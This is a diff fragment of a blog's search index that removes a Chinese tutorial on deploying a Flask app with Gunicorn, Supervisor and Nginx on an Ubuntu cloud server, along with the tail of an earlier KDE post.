-<p>中文社区的力量还是比较渺小，学英语真的很重要，英文社区啥都有（</p>
-]]></content>
-      <categories>
-        <category>系统</category>
-      </categories>
-      <tags>
-        <tag>KDE</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu+gunicorn+nginx在ECS上搭建Flask环境</title>
-    <url>/2020/10/01/gunicorn+nginx%E5%9C%A8ECS%E4%B8%8A%E6%90%AD%E5%BB%BAFlask%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<p>网络上能搜索到的资源基本都有些疏漏的地方，把自己的配置过程Po上来做个参考防止重复踩坑。</p>
-<a id="more"></a>
-<p><a href="https://zhuanlan.zhihu.com/p/22126999" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22126999</a> 这篇专栏写得还不错，参考了其中的一些内容做了自己的配置，不过这篇里也有一些没写清楚的超级坑点，坑了我好久，我在这里补充一些内容来防止重复踩坑了。</p>
-<p>相关版本清单如下：</p>
-<blockquote>
-<p>系统： Ubuntu 16.04 64位</p>
-<p>WSGI： Gunicorn</p>
-<p>进程监控： Supervisor</p>
-<p>服务器软件：nginx</p>
-<p>Python版本： python3.5.2</p>
-</blockquote>
-<h1>云服务器相关</h1>
-<p>笔者用的是阿里云ECS的学生机，当然你用其它家的产品也大同小异啦。</p>
-<p>ssh连接：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-<p>建立普通用户账号：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd www -d /home/www -m</span><br><span class="line">passwd www</span><br></pre></td></tr></table></figure>
-<h1>安装相关支持</h1>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure>
-<p>如果安装virtualenv遇到以下报错：</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">IOError: [Errno <span class="number">2</span>] <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory: <span class="string">'/tmp/pip-kYFqUa-build/setup.py'</span></span><br></pre></td></tr></table></figure>
-<p>尝试：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure>
-<h1>页面配置</h1>
-<p>先保留root终端，新开一个终端并使用刚才新建的用户登录服务器。</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> www<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-<p>创建网站根目录：</p>
-<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> blog</span><br></pre></td></tr></table></figure>
-<p>创建了工程的文件夹，这里用blog来代替，根据实际情况要换成其它的命名。</p>
-<p>下面创建虚拟环境：</p>
-<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">cd</span> <span class="keyword">blog</span></span><br><span class="line"><span class="keyword">virtualenv </span>-p /usr/<span class="keyword">bin/python3 </span>venv</span><br></pre></td></tr></table></figure>
-<p>使用SFTP可以上传本地的工程文件到blog文件夹。建议使用www用户。</p>
-<p>pip包生成requiements.txt:</p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">freeze</span> &gt; requirements.txt</span><br></pre></td></tr></table></figure>
-<h1>Gunicorn配置</h1>
-<p>下面配置Gunicorn：</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">source</span> <span class="string">venv/bin/activate</span></span><br><span class="line"><span class="attr">pip</span> <span class="string">install gunicorn</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/home/www/blog</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">gunicorn.conf</span></span><br></pre></td></tr></table></figure>
-<p>之后用vim写入：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程数</span></span><br><span class="line"><span class="attr">workers</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># 监听本地的哪个端口</span></span><br><span class="line"><span class="attr">bind</span> = <span class="string">'127.0.0.1:8000'</span></span><br></pre></td></tr></table></figure>
-<p><code>:wq</code>保存退出。</p>
-<p>安装组件：</p>
-<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -r requirements.txt</span><br></pre></td></tr></table></figure>
-<p>创建日志文件夹：</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> logs</span><br></pre></td></tr></table></figure>
-<p>退出虚拟环境：</p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">deactivate</span></span><br></pre></td></tr></table></figure>
-<h1>Supervisor配置</h1>
-<p><strong>使用root用户：</strong></p>
-<p>配置supervisor：</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">apt install supervisor</span><br><span class="line"><span class="keyword">cd</span> /etc/supervisor/<span class="keyword">conf</span>.d</span><br><span class="line"><span class="keyword">vim</span> blog.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
-<p>vim写入：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程的名字，取一个以后自己一眼知道是什么的名字。</span></span><br><span class="line"><span class="section">[program:blog]</span></span><br><span class="line"><span class="comment"># 定义命令。你只要注意后面的目录对就行。特别注意「run:app」的run，这个名字是你网站应用的文件名。如果是run.py，就写run。</span></span><br><span class="line"><span class="attr">command</span>=/home/www/blog/venv/bin/gunicorn run:app -c /home/www/blog/gunicorn.conf</span><br><span class="line"><span class="comment"># 网站目录</span></span><br><span class="line"><span class="attr">directory</span>=/home/www/blog</span><br><span class="line"><span class="comment"># 进程所属用户。</span></span><br><span class="line"><span class="attr">user</span>=www</span><br><span class="line"><span class="comment"># 自动重启设置。</span></span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 日志存放位置。</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=/home/www/blog/logs/gunicorn_supervisor.log</span><br><span class="line"><span class="comment"># 设置环境变量。这里这行的意思是：设置环境变量MODE的值为UAT。请根据自己的需要配置，如没有需要这行可以删除。</span></span><br><span class="line"><span class="attr">environment</span> = MODE=<span class="string">"UAT"</span></span><br></pre></td></tr></table></figure>
-<p><code>:wq</code>保存。</p>
-<p><strong>回到supervisor的目录：</strong></p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/etc/supervisor</span></span><br></pre></td></tr></table></figure>
-<p>启动supervisor：</p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service supervisor <span class="literal">start</span></span><br></pre></td></tr></table></figure>
-<p>加载配置：</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl reread</span></span><br><span class="line"><span class="attr">supervisorctl</span> <span class="string">update</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl start blog</span></span><br></pre></td></tr></table></figure>
-<h1>Nginx配置</h1>
-<p>开始配置nginx：</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">apt</span> <span class="string">install nginx</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/etc/nginx/sites-avaliable</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">blog</span></span><br></pre></td></tr></table></figure>
-<p>输入对于blog的配置：</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server</span> <span class="string">&#123;  </span></span><br><span class="line">        <span class="attr">listen</span>   <span class="string">80;  </span></span><br><span class="line">        <span class="attr">server_name</span> <span class="string">www.xxx.com xxx.com;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">root</span> <span class="string">/home/www/blog;</span></span><br><span class="line">        <span class="attr">access_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line">        <span class="attr">error_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">location</span> <span class="string">/ &#123;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">X-Forward-For $proxy_add_x_forwarded_for;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">Host $http_host;  </span></span><br><span class="line">            <span class="attr">proxy_redirect</span> <span class="string">off;  </span></span><br><span class="line">            <span class="attr">if</span> <span class="string">(!-f $request_filename) &#123;  </span></span><br><span class="line">                <span class="attr">proxy_pass</span> <span class="string">http://127.0.0.1:8000;  </span></span><br><span class="line">                <span class="meta">break;</span>  <span class="string"></span></span><br><span class="line">            <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">        <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">    <span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>**检查并根据实际情况修改上面的server_name和root配置。**检查监听端口和上面设置是否一致。<code>:wq</code>保存。</p>
-<p>下面链接配置文件到sites-enabled:</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span></span><br><span class="line">ln -s <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-avaliable/</span>blog .<span class="regexp">/blog</span></span><br></pre></td></tr></table></figure>
-<p>重启nginx：</p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service nginx restart</span></span><br></pre></td></tr></table></figure>
-<p>阿里云安全组配置允许入方向80端口。完成。</p>
-<p>键入域名或ip即可访问。</p>
-]]></content>
-      <categories>
-        <category>开发</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Python</tag>
       </tags>
   </entry>
 </search>
